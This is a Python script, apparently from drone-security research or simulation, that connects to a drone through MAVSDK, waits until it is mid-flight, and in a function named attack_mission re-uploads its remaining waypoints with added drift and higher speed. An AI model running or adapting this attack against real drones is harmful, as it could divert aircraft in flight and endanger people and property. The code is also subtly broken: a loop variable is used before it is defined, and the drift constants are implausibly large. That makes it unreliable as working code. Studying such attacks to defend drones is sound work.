import math
import random
from mavsdk import System
from mavsdk.mission import MissionItem, MissionPlan
import asyncio

# Drift settings for different route types
drift_factor_single = 1.1  
drift_factor_multi = 1.05  

def calculate_speed_adjustment(base_speed, num_waypoints):
    if num_waypoints == 1:
        return base_speed * 1.1  
    else:
        return base_speed * 1.05 


# Function to calculate drifted waypoints with sinusoidal drift
def sin_drift(lat, lon, alt, drift_distance, time_factor, num_waypoints=1):
    sinusoidal_drift = math.sin(time_factor * math.pi) * 0.0001
    random_drift = random.uniform(-0.00005, 0.00005)

    drift = drift_distance + sinusoidal_drift + random_drift
    new_lat = lat + drift * math.cos(time_factor)
    new_lon = lon + drift * math.sin(time_factor)
    new_alt = alt + (drift * 100)

    return new_lat, new_lon, new_alt

# Function to modify only future mission waypoints
async def attack_mission(drone, drift_distance, time_factor):
    await asyncio.sleep(150)
    mission_plan = await drone.mission.download_mission()
    mission_items = mission_plan.mission_items

    if not mission_items:
        print("No waypoints found!")
        return

    num_waypoints = len(mission_items)

    # Get current mission progress
    async for progress in drone.mission.mission_progress():
        current_wp = progress.current  
        break  

    print(f"Current waypoint before modification {current_wp}")
    print(f"Modifying waypoints from index {current_wp} onwards...")

    current_time_factor = time_factor + (idx * 0.5)
    
    for idx in range(current_wp, num_waypoints): 
        mission_item = mission_items[idx]
        new_lat, new_lon, new_alt = sin_drift(
            mission_item.latitude_deg, mission_item.longitude_deg,
            mission_item.relative_altitude_m, drift_distance, current_time_factor, num_waypoints
        )

        adjusted_speed = calculate_speed_adjustment(mission_item.speed_m_s, num_waypoints)

        mission_items[idx] = MissionItem(
            new_lat, new_lon, new_alt, adjusted_speed,
            mission_item.is_fly_through, mission_item.gimbal_pitch_deg, mission_item.gimbal_yaw_deg,
            mission_item.camera_action, acceptance_radius_m=5.0, yaw_deg=float('nan'),
            camera_photo_distance_m=0.0, camera_photo_interval_s=0.0,
            loiter_time_s=0.0, vehicle_action=MissionItem.VehicleAction.NONE
        )

    await drone.mission.upload_mission(MissionPlan(mission_items))
    print("Mission updated with drifted waypoints for future waypoints!")

    await drone.mission.set_current_mission_item(current_wp)
    print(f"Resuming mission from waypoint index {current_wp}")


# Main function to trigger modification mid-flight
async def mission_control():
    drone = System()
    await drone.connect(system_address="udp://:PORT")
    print("Waiting for connection...")

    async for state in drone.core.connection_state():
        if state.is_connected:
            print("Drone connected!")
            break

    mission_plan = await drone.mission.download_mission()
    num_waypoints = len(mission_plan.mission_items)

    if num_waypoints == 1:
        drift_distance = drift_factor_single
    else:
        drift_distance = drift_factor_multi

    time_factor = 1
    await attack_mission(drone, drift_distance, time_factor)


asyncio.run(mission_control())
